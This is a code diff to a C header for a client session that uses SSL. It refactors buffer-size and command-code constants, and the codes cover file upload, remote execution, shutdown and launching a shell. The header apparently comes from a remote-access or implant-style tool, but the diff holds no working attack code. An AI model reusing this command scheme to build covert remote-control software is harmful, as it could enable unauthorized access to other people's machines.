@@ -1,12 +1,13 @@
 #ifndef _CLIENT_SESSION_H
 #define _CLIENT_SESSION_H
-
+#include "debug.h"
 #include "polarssl/ssl.h"
-#include "polarssl/havege.h"
+#include "crypto.h"
 
 #include "compat.h"
 #include "function_strings.h"
 
+#define DATA_BUFFER_SIZE	4096
 #define	CONNECT_TIMEOUT	60 * 5 //connect timeout = 60 seconds * 5 minutes
 #define SESSION_TIMEOUT 60 * 60 * 1		// session timeout = 60 seconds * 60 minutes * 1 hours
 // for testing
@@ -56,11 +57,10 @@ typedef struct _REPLY {
  */
 
 typedef struct _DATA {
-	unsigned char	data[4096];
+	unsigned char	data[DATA_BUFFER_SIZE];
 } DATA;
 
 /* FOLLOWING DEFINITIONS FOR EXIT THROUGH HELP ARE ALSO IN servers Shell.h file */
-#define EXIT              0     /* command = ex for exit */
 #define UPLOAD            1     /* command = ul for upload */
 #define EXECUTE           2     /* command = exec for execute */
 #define UPLOADEXECUTE     3     /* not implemented att */
@@ -69,6 +69,7 @@ typedef struct _DATA {
 #define SHUTDOWNBOTH	  6		/* command = shut for shutdown, compat.h defines SHUTDOWN as 2 for sockets */
 #define HELP              7     /* command = help */
 #define LAUNCHTRUESHELL   8
+#define EXIT              10    /* command = ex for exit */
 
 unsigned long StartClientSession( int sock );
 
